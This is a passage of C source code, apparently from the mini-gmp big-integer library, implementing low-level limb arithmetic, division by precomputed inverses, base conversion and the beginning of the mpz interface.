    mp_limb_t __x;							\
    __x = (al) + (bl);							\
    (sh) = (ah) + (bh) + (__x < (al));					\
    (sl) = __x;								\
  } while (0)

#define gmp_sub_ddmmss(sh, sl, ah, al, bh, bl) \
  do {									\
    mp_limb_t __x;							\
    __x = (al) - (bl);							\
    (sh) = (ah) - (bh) - ((al) < (bl));					\
    (sl) = __x;								\
  } while (0)

#define gmp_umul_ppmm(w1, w0, u, v)					\
  do {									\
    mp_limb_t __x0, __x1, __x2, __x3;					\
    unsigned __ul, __vl, __uh, __vh;					\
    mp_limb_t __u = (u), __v = (v);					\
									\
    __ul = __u & GMP_LLIMB_MASK;					\
    __uh = __u >> (GMP_LIMB_BITS / 2);					\
    __vl = __v & GMP_LLIMB_MASK;					\
    __vh = __v >> (GMP_LIMB_BITS / 2);					\
									\
    __x0 = (mp_limb_t) __ul * __vl;					\
    __x1 = (mp_limb_t) __ul * __vh;					\
    __x2 = (mp_limb_t) __uh * __vl;					\
    __x3 = (mp_limb_t) __uh * __vh;					\
									\
    __x1 += __x0 >> (GMP_LIMB_BITS / 2);/* this can't give carry */	\
    __x1 += __x2;		/* but this indeed can */		\
    if (__x1 < __x2)		/* did we get it? */			\
      __x3 += GMP_HLIMB_BIT;	/* yes, add it in the proper pos. */	\
									\
    (w1) = __x3 + (__x1 >> (GMP_LIMB_BITS / 2));			\
    (w0) = (__x1 << (GMP_LIMB_BITS / 2)) + (__x0 & GMP_LLIMB_MASK);	\
  } while (0)

#define gmp_udiv_qrnnd_preinv(q, r, nh, nl, d, di)			\
  do {									\
    mp_limb_t _qh, _ql, _r, _mask;					\
    gmp_umul_ppmm (_qh, _ql, (nh), (di));				\
    gmp_add_ssaaaa (_qh, _ql, _qh, _ql, (nh) + 1, (nl));		\
    _r = (nl) - _qh * (d);						\
    _mask = -(mp_limb_t) (_r > _ql); /* both > and >= are OK */		\
    _qh += _mask;							\
    _r += _mask & (d);							\
    if (_r >= (d))							\
      {									\
	_r -= (d);							\
	_qh++;								\
      }									\
									\
    (r) = _r;								\
    (q) = _qh;								\
  } while (0)

#define gmp_udiv_qr_3by2(q, r1, r0, n2, n1, n0, d1, d0, dinv)		\
  do {									\
    mp_limb_t _q0, _t1, _t0, _mask;					\
    gmp_umul_ppmm ((q), _q0, (n2), (dinv));				\
    gmp_add_ssaaaa ((q), _q0, (q), _q0, (n2), (n1));			\
									\
    /* Compute the two most significant limbs of n - q'd */		\
    (r1) = (n1) - (d1) * (q);						\
    gmp_sub_ddmmss ((r1), (r0), (r1), (n0), (d1), (d0));		\
    gmp_umul_ppmm (_t1, _t0, (d0), (q));				\
    gmp_sub_ddmmss ((r1), (r0), (r1), (r0), _t1, _t0);			\
    (q)++;								\
									\
    /* Conditionally adjust q and the remainders */			\
    _mask = - (mp_limb_t) ((r1) >= _q0);				\
    (q) += _mask;							\
    gmp_add_ssaaaa ((r1), (r0), (r1), (r0), _mask & (d1), _mask & (d0)); \
    if ((r1) >= (d1))							\
      {									\
	if ((r1) > (d1) || (r0) >= (d0))				\
	  {								\
	    (q)++;							\
	    gmp_sub_ddmmss ((r1), (r0), (r1), (r0), (d1), (d0));	\
	  }								\
      }									\
  } while (0)

/* Swap macros. */
#define MP_LIMB_T_SWAP(x, y)						\
  do {									\
    mp_limb_t __mp_limb_t_swap__tmp = (x);				\
    (x) = (y);								\
    (y) = __mp_limb_t_swap__tmp;					\
  } while (0)
#define MP_SIZE_T_SWAP(x, y)						\
  do {									\
    mp_size_t __mp_size_t_swap__tmp = (x);				\
    (x) = (y);								\
    (y) = __mp_size_t_swap__tmp;					\
  } while (0)
#define MP_BITCNT_T_SWAP(x,y)			\
  do {						\
    mp_bitcnt_t __mp_bitcnt_t_swap__tmp = (x);	\
    (x) = (y);					\
    (y) = __mp_bitcnt_t_swap__tmp;		\
  } while (0)
#define MP_PTR_SWAP(x, y)						\
  do {									\
    mp_ptr __mp_ptr_swap__tmp = (x);					\
    (x) = (y);								\
    (y) = __mp_ptr_swap__tmp;						\
  } while (0)
#define MP_SRCPTR_SWAP(x, y)						\
  do {									\
    mp_srcptr __mp_srcptr_swap__tmp = (x);				\
    (x) = (y);								\
    (y) = __mp_srcptr_swap__tmp;					\
  } while (0)

#define MPN_PTR_SWAP(xp,xs, yp,ys)					\
  do {									\
    MP_PTR_SWAP (xp, yp);						\
    MP_SIZE_T_SWAP (xs, ys);						\
  } while(0)
#define MPN_SRCPTR_SWAP(xp,xs, yp,ys)					\
  do {									\
    MP_SRCPTR_SWAP (xp, yp);						\
    MP_SIZE_T_SWAP (xs, ys);						\
  } while(0)

#define MPZ_PTR_SWAP(x, y)						\
  do {									\
    mpz_ptr __mpz_ptr_swap__tmp = (x);					\
    (x) = (y);								\
    (y) = __mpz_ptr_swap__tmp;						\
  } while (0)
#define MPZ_SRCPTR_SWAP(x, y)						\
  do {									\
    mpz_srcptr __mpz_srcptr_swap__tmp = (x);				\
    (x) = (y);								\
    (y) = __mpz_srcptr_swap__tmp;					\
  } while (0)

const int mp_bits_per_limb = GMP_LIMB_BITS;


/* Memory allocation and other helper functions. */
static void
gmp_die (const char *msg)
{
    fprintf (stderr, "%s\\n", msg);
    abort();
}

static void *
gmp_default_alloc (size_t size)
{
    void *p;

    assert (size > 0);

    p = malloc (size);
    if (!p)
        gmp_die("gmp_default_alloc: Virtual memory exhausted.");

    return p;
}

static void *
gmp_default_realloc (void *old, size_t old_size, size_t new_size)
{
    void * p;

    p = realloc (old, new_size);

    if (!p)
        gmp_die("gmp_default_realloc: Virtual memory exhausted.");

    return p;
}

static void
gmp_default_free (void *p, size_t size)
{
    free (p);
}

static void * (*gmp_allocate_func) (size_t) = gmp_default_alloc;
static void * (*gmp_reallocate_func) (void *, size_t, size_t) = gmp_default_realloc;
static void (*gmp_free_func) (void *, size_t) = gmp_default_free;

void
mp_get_memory_functions (void *(**alloc_func) (size_t),
                         void *(**realloc_func) (void *, size_t, size_t),
                         void (**free_func) (void *, size_t))
{
    if (alloc_func)
        *alloc_func = gmp_allocate_func;

    if (realloc_func)
        *realloc_func = gmp_reallocate_func;

    if (free_func)
        *free_func = gmp_free_func;
}

void
mp_set_memory_functions (void *(*alloc_func) (size_t),
                         void *(*realloc_func) (void *, size_t, size_t),
                         void (*free_func) (void *, size_t))
{
    if (!alloc_func)
        alloc_func = gmp_default_alloc;
    if (!realloc_func)
        realloc_func = gmp_default_realloc;
    if (!free_func)
        free_func = gmp_default_free;

    gmp_allocate_func = alloc_func;
    gmp_reallocate_func = realloc_func;
    gmp_free_func = free_func;
}

#define gmp_xalloc(size) ((*gmp_allocate_func)((size)))
#define gmp_free(p) ((*gmp_free_func) ((p), 0))

static mp_ptr
gmp_xalloc_limbs (mp_size_t size)
{
    return (mp_ptr) gmp_xalloc (size * sizeof (mp_limb_t));
}

static mp_ptr
gmp_xrealloc_limbs (mp_ptr old, mp_size_t size)
{
    assert (size > 0);
    return (mp_ptr) (*gmp_reallocate_func) (old, 0, size * sizeof (mp_limb_t));
}


/* MPN interface */

void
mpn_copyi (mp_ptr d, mp_srcptr s, mp_size_t n)
{
    mp_size_t i;
    for (i = 0; i < n; i++)
        d[i] = s[i];
}

void
mpn_copyd (mp_ptr d, mp_srcptr s, mp_size_t n)
{
    while (--n >= 0)
        d[n] = s[n];
}

int
mpn_cmp (mp_srcptr ap, mp_srcptr bp, mp_size_t n)
{
    while (--n >= 0)
    {
        if (ap[n] != bp[n])
            return ap[n] > bp[n] ? 1 : -1;
    }
    return 0;
}

static int
mpn_cmp4 (mp_srcptr ap, mp_size_t an, mp_srcptr bp, mp_size_t bn)
{
    if (an != bn)
        return an < bn ? -1 : 1;
    else
        return mpn_cmp (ap, bp, an);
}

static mp_size_t
mpn_normalized_size (mp_srcptr xp, mp_size_t n)
{
    while (n > 0 && xp[n-1] == 0)
        --n;
    return n;
}

int
mpn_zero_p(mp_srcptr rp, mp_size_t n)
{
    return mpn_normalized_size (rp, n) == 0;
}

void
mpn_zero (mp_ptr rp, mp_size_t n)
{
    while (--n >= 0)
        rp[n] = 0;
}

mp_limb_t
mpn_add_1 (mp_ptr rp, mp_srcptr ap, mp_size_t n, mp_limb_t b)
{
    mp_size_t i;

    assert (n > 0);
    i = 0;
    do
    {
        mp_limb_t r = ap[i] + b;
        /* Carry out */
        b = (r < b);
        rp[i] = r;
    }
    while (++i < n);

    return b;
}

mp_limb_t
mpn_add_n (mp_ptr rp, mp_srcptr ap, mp_srcptr bp, mp_size_t n)
{
    mp_size_t i;
    mp_limb_t cy;

    for (i = 0, cy = 0; i < n; i++)
    {
        mp_limb_t a, b, r;
        a = ap[i]; b = bp[i];
        r = a + cy;
        cy = (r < cy);
        r += b;
        cy += (r < b);
        rp[i] = r;
    }
    return cy;
}

mp_limb_t
mpn_add (mp_ptr rp, mp_srcptr ap, mp_size_t an, mp_srcptr bp, mp_size_t bn)
{
    mp_limb_t cy;

    assert (an >= bn);

    cy = mpn_add_n (rp, ap, bp, bn);
    if (an > bn)
        cy = mpn_add_1 (rp + bn, ap + bn, an - bn, cy);
    return cy;
}

mp_limb_t
mpn_sub_1 (mp_ptr rp, mp_srcptr ap, mp_size_t n, mp_limb_t b)
{
    mp_size_t i;

    assert (n > 0);

    i = 0;
    do
    {
        mp_limb_t a = ap[i];
        /* Carry out */
        mp_limb_t cy = a < b;;
        rp[i] = a - b;
        b = cy;
    }
    while (++i < n);

    return b;
}

mp_limb_t
mpn_sub_n (mp_ptr rp, mp_srcptr ap, mp_srcptr bp, mp_size_t n)
{
    mp_size_t i;
    mp_limb_t cy;

    for (i = 0, cy = 0; i < n; i++)
    {
        mp_limb_t a, b;
        a = ap[i]; b = bp[i];
        b += cy;
        cy = (b < cy);
        cy += (a < b);
        rp[i] = a - b;
    }
    return cy;
}

mp_limb_t
mpn_sub (mp_ptr rp, mp_srcptr ap, mp_size_t an, mp_srcptr bp, mp_size_t bn)
{
    mp_limb_t cy;

    assert (an >= bn);

    cy = mpn_sub_n (rp, ap, bp, bn);
    if (an > bn)
        cy = mpn_sub_1 (rp + bn, ap + bn, an - bn, cy);
    return cy;
}

mp_limb_t
mpn_mul_1 (mp_ptr rp, mp_srcptr up, mp_size_t n, mp_limb_t vl)
{
    mp_limb_t ul, cl, hpl, lpl;

    assert (n >= 1);

    cl = 0;
    do
    {
        ul = *up++;
        gmp_umul_ppmm (hpl, lpl, ul, vl);

        lpl += cl;
        cl = (lpl < cl) + hpl;

        *rp++ = lpl;
    }
    while (--n != 0);

    return cl;
}

mp_limb_t
mpn_addmul_1 (mp_ptr rp, mp_srcptr up, mp_size_t n, mp_limb_t vl)
{
    mp_limb_t ul, cl, hpl, lpl, rl;

    assert (n >= 1);

    cl = 0;
    do
    {
        ul = *up++;
        gmp_umul_ppmm (hpl, lpl, ul, vl);

        lpl += cl;
        cl = (lpl < cl) + hpl;

        rl = *rp;
        lpl = rl + lpl;
        cl += lpl < rl;
        *rp++ = lpl;
    }
    while (--n != 0);

    return cl;
}

mp_limb_t
mpn_submul_1 (mp_ptr rp, mp_srcptr up, mp_size_t n, mp_limb_t vl)
{
    mp_limb_t ul, cl, hpl, lpl, rl;

    assert (n >= 1);

    cl = 0;
    do
    {
        ul = *up++;
        gmp_umul_ppmm (hpl, lpl, ul, vl);

        lpl += cl;
        cl = (lpl < cl) + hpl;

        rl = *rp;
        lpl = rl - lpl;
        cl += lpl > rl;
        *rp++ = lpl;
    }
    while (--n != 0);

    return cl;
}

mp_limb_t
mpn_mul (mp_ptr rp, mp_srcptr up, mp_size_t un, mp_srcptr vp, mp_size_t vn)
{
    assert (un >= vn);
    assert (vn >= 1);

    /* We first multiply by the low order limb. This result can be
       stored, not added, to rp. We also avoid a loop for zeroing this
       way. */

    rp[un] = mpn_mul_1 (rp, up, un, vp[0]);

    /* Now accumulate the product of up[] and the next higher limb from
       vp[]. */

    while (--vn >= 1)
    {
        rp += 1, vp += 1;
        rp[un] = mpn_addmul_1 (rp, up, un, vp[0]);
    }
    return rp[un];
}

void
mpn_mul_n (mp_ptr rp, mp_srcptr ap, mp_srcptr bp, mp_size_t n)
{
    mpn_mul (rp, ap, n, bp, n);
}

void
mpn_sqr (mp_ptr rp, mp_srcptr ap, mp_size_t n)
{
    mpn_mul (rp, ap, n, ap, n);
}

mp_limb_t
mpn_lshift (mp_ptr rp, mp_srcptr up, mp_size_t n, unsigned int cnt)
{
    mp_limb_t high_limb, low_limb;
    unsigned int tnc;
    mp_limb_t retval;

    assert (n >= 1);
    assert (cnt >= 1);
    assert (cnt < GMP_LIMB_BITS);

    up += n;
    rp += n;

    tnc = GMP_LIMB_BITS - cnt;
    low_limb = *--up;
    retval = low_limb >> tnc;
    high_limb = (low_limb << cnt);

    while (--n != 0)
    {
        low_limb = *--up;
        *--rp = high_limb | (low_limb >> tnc);
        high_limb = (low_limb << cnt);
    }
    *--rp = high_limb;

    return retval;
}

mp_limb_t
mpn_rshift (mp_ptr rp, mp_srcptr up, mp_size_t n, unsigned int cnt)
{
    mp_limb_t high_limb, low_limb;
    unsigned int tnc;
    mp_limb_t retval;

    assert (n >= 1);
    assert (cnt >= 1);
    assert (cnt < GMP_LIMB_BITS);

    tnc = GMP_LIMB_BITS - cnt;
    high_limb = *up++;
    retval = (high_limb << tnc);
    low_limb = high_limb >> cnt;

    while (--n != 0)
    {
        high_limb = *up++;
        *rp++ = low_limb | (high_limb << tnc);
        low_limb = high_limb >> cnt;
    }
    *rp = low_limb;

    return retval;
}

static mp_bitcnt_t
mpn_common_scan (mp_limb_t limb, mp_size_t i, mp_srcptr up, mp_size_t un,
                 mp_limb_t ux)
{
    unsigned cnt;

    assert (ux == 0 || ux == GMP_LIMB_MAX);
    assert (0 <= i && i <= un );

    while (limb == 0)
    {
        i++;
        if (i == un)
            return (ux == 0 ? ~(mp_bitcnt_t) 0 : un * GMP_LIMB_BITS);
        limb = ux ^ up[i];
    }
    gmp_ctz (cnt, limb);
    return (mp_bitcnt_t) i * GMP_LIMB_BITS + cnt;
}

mp_bitcnt_t
mpn_scan1 (mp_srcptr ptr, mp_bitcnt_t bit)
{
    mp_size_t i;
    i = bit / GMP_LIMB_BITS;

    return mpn_common_scan ( ptr[i] & (GMP_LIMB_MAX << (bit % GMP_LIMB_BITS)),
                             i, ptr, i, 0);
}

mp_bitcnt_t
mpn_scan0 (mp_srcptr ptr, mp_bitcnt_t bit)
{
    mp_size_t i;
    i = bit / GMP_LIMB_BITS;

    return mpn_common_scan (~ptr[i] & (GMP_LIMB_MAX << (bit % GMP_LIMB_BITS)),
                            i, ptr, i, GMP_LIMB_MAX);
}

void
mpn_com (mp_ptr rp, mp_srcptr up, mp_size_t n)
{
    while (--n >= 0)
        *rp++ = ~ *up++;
}

mp_limb_t
mpn_neg (mp_ptr rp, mp_srcptr up, mp_size_t n)
{
    while (*up == 0)
    {
        *rp = 0;
        if (!--n)
            return 0;
        ++up; ++rp;
    }
    *rp = - *up;
    mpn_com (++rp, ++up, --n);
    return 1;
}


/* MPN division interface. */
mp_limb_t
mpn_invert_3by2 (mp_limb_t u1, mp_limb_t u0)
{
    mp_limb_t r, p, m;
    unsigned ul, uh;
    unsigned ql, qh;

    /* First, do a 2/1 inverse. */
    /* The inverse m is defined as floor( (B^2 - 1 - u1)/u1 ), so that 0 <
     * B^2 - (B + m) u1 <= u1 */
    assert (u1 >= GMP_LIMB_HIGHBIT);

    ul = u1 & GMP_LLIMB_MASK;
    uh = u1 >> (GMP_LIMB_BITS / 2);

    qh = ~u1 / uh;
    r = ((~u1 - (mp_limb_t) qh * uh) << (GMP_LIMB_BITS / 2)) | GMP_LLIMB_MASK;

    p = (mp_limb_t) qh * ul;
    /* Adjustment steps taken from udiv_qrnnd_c */
    if (r < p)
    {
        qh--;
        r += u1;
        if (r >= u1) /* i.e. we didn't get carry when adding to r */
            if (r < p)
            {
                qh--;
                r += u1;
            }
    }
    r -= p;

    /* Do a 3/2 division (with half limb size) */
    p = (r >> (GMP_LIMB_BITS / 2)) * qh + r;
    ql = (p >> (GMP_LIMB_BITS / 2)) + 1;

    /* By the 3/2 method, we don't need the high half limb. */
    r = (r << (GMP_LIMB_BITS / 2)) + GMP_LLIMB_MASK - ql * u1;

    if (r >= (p << (GMP_LIMB_BITS / 2)))
    {
        ql--;
        r += u1;
    }
    m = ((mp_limb_t) qh << (GMP_LIMB_BITS / 2)) + ql;
    if (r >= u1)
    {
        m++;
        r -= u1;
    }

    if (u0 > 0)
    {
        mp_limb_t th, tl;
        r = ~r;
        r += u0;
        if (r < u0)
        {
            m--;
            if (r >= u1)
            {
                m--;
                r -= u1;
            }
            r -= u1;
        }
        gmp_umul_ppmm (th, tl, u0, m);
        r += th;
        if (r < th)
        {
            m--;
            m -= ((r > u1) | ((r == u1) & (tl > u0)));
        }
    }

    return m;
}

struct gmp_div_inverse
{
    /* Normalization shift count. */
    unsigned shift;
    /* Normalized divisor (d0 unused for mpn_div_qr_1) */
    mp_limb_t d1, d0;
    /* Inverse, for 2/1 or 3/2. */
    mp_limb_t di;
};

static void
mpn_div_qr_1_invert (struct gmp_div_inverse *inv, mp_limb_t d)
{
    unsigned shift;

    assert (d > 0);
    gmp_clz (shift, d);
    inv->shift = shift;
    inv->d1 = d << shift;
    inv->di = mpn_invert_limb (inv->d1);
}

static void
mpn_div_qr_2_invert (struct gmp_div_inverse *inv,
                     mp_limb_t d1, mp_limb_t d0)
{
    unsigned shift;

    assert (d1 > 0);
    gmp_clz (shift, d1);
    inv->shift = shift;
    if (shift > 0)
    {
        d1 = (d1 << shift) | (d0 >> (GMP_LIMB_BITS - shift));
        d0 <<= shift;
    }
    inv->d1 = d1;
    inv->d0 = d0;
    inv->di = mpn_invert_3by2 (d1, d0);
}

static void
mpn_div_qr_invert (struct gmp_div_inverse *inv,
                   mp_srcptr dp, mp_size_t dn)
{
    assert (dn > 0);

    if (dn == 1)
        mpn_div_qr_1_invert (inv, dp[0]);
    else if (dn == 2)
        mpn_div_qr_2_invert (inv, dp[1], dp[0]);
    else
    {
        unsigned shift;
        mp_limb_t d1, d0;

        d1 = dp[dn-1];
        d0 = dp[dn-2];
        assert (d1 > 0);
        gmp_clz (shift, d1);
        inv->shift = shift;
        if (shift > 0)
        {
            d1 = (d1 << shift) | (d0 >> (GMP_LIMB_BITS - shift));
            d0 = (d0 << shift) | (dp[dn-3] >> (GMP_LIMB_BITS - shift));
        }
        inv->d1 = d1;
        inv->d0 = d0;
        inv->di = mpn_invert_3by2 (d1, d0);
    }
}

/* Not matching current public gmp interface, rather corresponding to
   the sbpi1_div_* functions. */
static mp_limb_t
mpn_div_qr_1_preinv (mp_ptr qp, mp_srcptr np, mp_size_t nn,
                     const struct gmp_div_inverse *inv)
{
    mp_limb_t d, di;
    mp_limb_t r;
    mp_ptr tp = NULL;

    if (inv->shift > 0)
    {
        tp = gmp_xalloc_limbs (nn);
        r = mpn_lshift (tp, np, nn, inv->shift);
        np = tp;
    }
    else
        r = 0;

    d = inv->d1;
    di = inv->di;
    while (--nn >= 0)
    {
        mp_limb_t q;

        gmp_udiv_qrnnd_preinv (q, r, r, np[nn], d, di);
        if (qp)
            qp[nn] = q;
    }
    if (inv->shift > 0)
        gmp_free (tp);

    return r >> inv->shift;
}

static mp_limb_t
mpn_div_qr_1 (mp_ptr qp, mp_srcptr np, mp_size_t nn, mp_limb_t d)
{
    assert (d > 0);

    /* Special case for powers of two. */
    if ((d & (d-1)) == 0)
    {
        mp_limb_t r = np[0] & (d-1);
        if (qp)
        {
            if (d <= 1)
                mpn_copyi (qp, np, nn);
            else
            {
                unsigned shift;
                gmp_ctz (shift, d);
                mpn_rshift (qp, np, nn, shift);
            }
        }
        return r;
    }
    else
    {
        struct gmp_div_inverse inv;
        mpn_div_qr_1_invert (&inv, d);
        return mpn_div_qr_1_preinv (qp, np, nn, &inv);
    }
}

static void
mpn_div_qr_2_preinv (mp_ptr qp, mp_ptr rp, mp_srcptr np, mp_size_t nn,
                     const struct gmp_div_inverse *inv)
{
    unsigned shift;
    mp_size_t i;
    mp_limb_t d1, d0, di, r1, r0;
    mp_ptr tp;

    assert (nn >= 2);
    shift = inv->shift;
    d1 = inv->d1;
    d0 = inv->d0;
    di = inv->di;

    if (shift > 0)
    {
        tp = gmp_xalloc_limbs (nn);
        r1 = mpn_lshift (tp, np, nn, shift);
        np = tp;
    }
    else
        r1 = 0;

    r0 = np[nn - 1];

    i = nn - 2;
    do
    {
        mp_limb_t n0, q;
        n0 = np[i];
        gmp_udiv_qr_3by2 (q, r1, r0, r1, r0, n0, d1, d0, di);

        if (qp)
            qp[i] = q;
    }
    while (--i >= 0);

    if (shift > 0)
    {
        assert ((r0 << (GMP_LIMB_BITS - shift)) == 0);
        r0 = (r0 >> shift) | (r1 << (GMP_LIMB_BITS - shift));
        r1 >>= shift;

        gmp_free (tp);
    }

    rp[1] = r1;
    rp[0] = r0;
}

#if 0
static void
mpn_div_qr_2 (mp_ptr qp, mp_ptr rp, mp_srcptr np, mp_size_t nn,
	      mp_limb_t d1, mp_limb_t d0)
{
  struct gmp_div_inverse inv;
  assert (nn >= 2);

  mpn_div_qr_2_invert (&inv, d1, d0);
  mpn_div_qr_2_preinv (qp, rp, np, nn, &inv);
}
#endif

static void
mpn_div_qr_pi1 (mp_ptr qp,
                mp_ptr np, mp_size_t nn, mp_limb_t n1,
                mp_srcptr dp, mp_size_t dn,
                mp_limb_t dinv)
{
    mp_size_t i;

    mp_limb_t d1, d0;
    mp_limb_t cy, cy1;
    mp_limb_t q;

    assert (dn > 2);
    assert (nn >= dn);

    d1 = dp[dn - 1];
    d0 = dp[dn - 2];

    assert ((d1 & GMP_LIMB_HIGHBIT) != 0);
    /* Iteration variable is the index of the q limb.
     *
     * We divide <n1, np[dn-1+i], np[dn-2+i], np[dn-3+i],..., np[i]>
     * by            <d1,          d0,        dp[dn-3],  ..., dp[0] >
     */

    i = nn - dn;
    do
    {
        mp_limb_t n0 = np[dn-1+i];

        if (n1 == d1 && n0 == d0)
        {
            q = GMP_LIMB_MAX;
            mpn_submul_1 (np+i, dp, dn, q);
            n1 = np[dn-1+i];	/* update n1, last loop's value will now be invalid */
        }
        else
        {
            gmp_udiv_qr_3by2 (q, n1, n0, n1, n0, np[dn-2+i], d1, d0, dinv);

            cy = mpn_submul_1 (np + i, dp, dn-2, q);

            cy1 = n0 < cy;
            n0 = n0 - cy;
            cy = n1 < cy1;
            n1 = n1 - cy1;
            np[dn-2+i] = n0;

            if (cy != 0)
            {
                n1 += d1 + mpn_add_n (np + i, np + i, dp, dn - 1);
                q--;
            }
        }

        if (qp)
            qp[i] = q;
    }
    while (--i >= 0);

    np[dn - 1] = n1;
}

static void
mpn_div_qr_preinv (mp_ptr qp, mp_ptr np, mp_size_t nn,
                   mp_srcptr dp, mp_size_t dn,
                   const struct gmp_div_inverse *inv)
{
    assert (dn > 0);
    assert (nn >= dn);

    if (dn == 1)
        np[0] = mpn_div_qr_1_preinv (qp, np, nn, inv);
    else if (dn == 2)
        mpn_div_qr_2_preinv (qp, np, np, nn, inv);
    else
    {
        mp_limb_t nh;
        unsigned shift;

        assert (inv->d1 == dp[dn-1]);
        assert (inv->d0 == dp[dn-2]);
        assert ((inv->d1 & GMP_LIMB_HIGHBIT) != 0);

        shift = inv->shift;
        if (shift > 0)
            nh = mpn_lshift (np, np, nn, shift);
        else
            nh = 0;

        mpn_div_qr_pi1 (qp, np, nn, nh, dp, dn, inv->di);

        if (shift > 0)
            gmp_assert_nocarry (mpn_rshift (np, np, dn, shift));
    }
}

static void
mpn_div_qr (mp_ptr qp, mp_ptr np, mp_size_t nn, mp_srcptr dp, mp_size_t dn)
{
    struct gmp_div_inverse inv;
    mp_ptr tp = NULL;

    assert (dn > 0);
    assert (nn >= dn);

    mpn_div_qr_invert (&inv, dp, dn);
    if (dn > 2 && inv.shift > 0)
    {
        tp = gmp_xalloc_limbs (dn);
        gmp_assert_nocarry (mpn_lshift (tp, dp, dn, inv.shift));
        dp = tp;
    }
    mpn_div_qr_preinv (qp, np, nn, dp, dn, &inv);
    if (tp)
        gmp_free (tp);
}


/* MPN base conversion. */
static unsigned
mpn_base_power_of_two_p (unsigned b)
{
    switch (b)
    {
        case 2: return 1;
        case 4: return 2;
        case 8: return 3;
        case 16: return 4;
        case 32: return 5;
        case 64: return 6;
        case 128: return 7;
        case 256: return 8;
        default: return 0;
    }
}

struct mpn_base_info
{
    /* bb is the largest power of the base which fits in one limb, and
       exp is the corresponding exponent. */
    unsigned exp;
    mp_limb_t bb;
};

static void
mpn_get_base_info (struct mpn_base_info *info, mp_limb_t b)
{
    mp_limb_t m;
    mp_limb_t p;
    unsigned exp;

    m = GMP_LIMB_MAX / b;
    for (exp = 1, p = b; p <= m; exp++)
        p *= b;

    info->exp = exp;
    info->bb = p;
}

static mp_bitcnt_t
mpn_limb_size_in_base_2 (mp_limb_t u)
{
    unsigned shift;

    assert (u > 0);
    gmp_clz (shift, u);
    return GMP_LIMB_BITS - shift;
}

static size_t
mpn_get_str_bits (unsigned char *sp, unsigned bits, mp_srcptr up, mp_size_t un)
{
    unsigned char mask;
    size_t sn, j;
    mp_size_t i;
    unsigned shift;

    sn = ((un - 1) * GMP_LIMB_BITS + mpn_limb_size_in_base_2 (up[un-1])
          + bits - 1) / bits;

    mask = (1U << bits) - 1;

    for (i = 0, j = sn, shift = 0; j-- > 0;)
    {
        unsigned char digit = up[i] >> shift;

        shift += bits;

        if (shift >= GMP_LIMB_BITS && ++i < un)
        {
            shift -= GMP_LIMB_BITS;
            digit |= up[i] << (bits - shift);
        }
        sp[j] = digit & mask;
    }
    return sn;
}

/* We generate digits from the least significant end, and reverse at
   the end. */
static size_t
mpn_limb_get_str (unsigned char *sp, mp_limb_t w,
                  const struct gmp_div_inverse *binv)
{
    mp_size_t i;
    for (i = 0; w > 0; i++)
    {
        mp_limb_t h, l, r;

        h = w >> (GMP_LIMB_BITS - binv->shift);
        l = w << binv->shift;

        gmp_udiv_qrnnd_preinv (w, r, h, l, binv->d1, binv->di);
        assert ( (r << (GMP_LIMB_BITS - binv->shift)) == 0);
        r >>= binv->shift;

        sp[i] = r;
    }
    return i;
}

static size_t
mpn_get_str_other (unsigned char *sp,
                   int base, const struct mpn_base_info *info,
                   mp_ptr up, mp_size_t un)
{
    struct gmp_div_inverse binv;
    size_t sn;
    size_t i;

    mpn_div_qr_1_invert (&binv, base);

    sn = 0;

    if (un > 1)
    {
        struct gmp_div_inverse bbinv;
        mpn_div_qr_1_invert (&bbinv, info->bb);

        do
        {
            mp_limb_t w;
            size_t done;
            w = mpn_div_qr_1_preinv (up, up, un, &bbinv);
            un -= (up[un-1] == 0);
            done = mpn_limb_get_str (sp + sn, w, &binv);

            for (sn += done; done < info->exp; done++)
                sp[sn++] = 0;
        }
        while (un > 1);
    }
    sn += mpn_limb_get_str (sp + sn, up[0], &binv);

    /* Reverse order */
    for (i = 0; 2*i + 1 < sn; i++)
    {
        unsigned char t = sp[i];
        sp[i] = sp[sn - i - 1];
        sp[sn - i - 1] = t;
    }

    return sn;
}

size_t
mpn_get_str (unsigned char *sp, int base, mp_ptr up, mp_size_t un)
{
    unsigned bits;

    assert (un > 0);
    assert (up[un-1] > 0);

    bits = mpn_base_power_of_two_p (base);
    if (bits)
        return mpn_get_str_bits (sp, bits, up, un);
    else
    {
        struct mpn_base_info info;

        mpn_get_base_info (&info, base);
        return mpn_get_str_other (sp, base, &info, up, un);
    }
}

static mp_size_t
mpn_set_str_bits (mp_ptr rp, const unsigned char *sp, size_t sn,
                  unsigned bits)
{
    mp_size_t rn;
    size_t j;
    unsigned shift;

    for (j = sn, rn = 0, shift = 0; j-- > 0; )
    {
        if (shift == 0)
        {
            rp[rn++] = sp[j];
            shift += bits;
        }
        else
        {
            rp[rn-1] |= (mp_limb_t) sp[j] << shift;
            shift += bits;
            if (shift >= GMP_LIMB_BITS)
            {
                shift -= GMP_LIMB_BITS;
                if (shift > 0)
                    rp[rn++] = (mp_limb_t) sp[j] >> (bits - shift);
            }
        }
    }
    rn = mpn_normalized_size (rp, rn);
    return rn;
}

static mp_size_t
mpn_set_str_other (mp_ptr rp, const unsigned char *sp, size_t sn,
                   mp_limb_t b, const struct mpn_base_info *info)
{
    mp_size_t rn;
    mp_limb_t w;
    unsigned k;
    size_t j;

    k = 1 + (sn - 1) % info->exp;

    j = 0;
    w = sp[j++];
    while (--k != 0)
        w = w * b + sp[j++];

    rp[0] = w;

    for (rn = (w > 0); j < sn;)
    {
        mp_limb_t cy;

        w = sp[j++];
        for (k = 1; k < info->exp; k++)
            w = w * b + sp[j++];

        cy = mpn_mul_1 (rp, rp, rn, info->bb);
        cy += mpn_add_1 (rp, rp, rn, w);
        if (cy > 0)
            rp[rn++] = cy;
    }
    assert (j == sn);

    return rn;
}

mp_size_t
mpn_set_str (mp_ptr rp, const unsigned char *sp, size_t sn, int base)
{
    unsigned bits;

    if (sn == 0)
        return 0;

    bits = mpn_base_power_of_two_p (base);
    if (bits)
        return mpn_set_str_bits (rp, sp, sn, bits);
    else
    {
        struct mpn_base_info info;

        mpn_get_base_info (&info, base);
        return mpn_set_str_other (rp, sp, sn, base, &info);
    }
}


/* MPZ interface */
void
mpz_init (mpz_t r)
{
    static const mp_limb_t dummy_limb = 0xc1a0;

    r->_mp_alloc = 0;
    r->_mp_size = 0;
    r->_mp_d = (mp_ptr) &dummy_limb;
}

/* The utility of this function is a bit limited, since many functions
   assigns the result variable using mpz_swap. */
void
mpz_init2 (mpz_t r, mp_bitcnt_t bits)
{
    mp_size_t rn;

    bits -= (bits != 0);		/* Round down, except if 0 */
    rn = 1 + bits / GMP_LIMB_BITS;

    r->_mp_alloc = rn;
    r->_mp_size = 0;
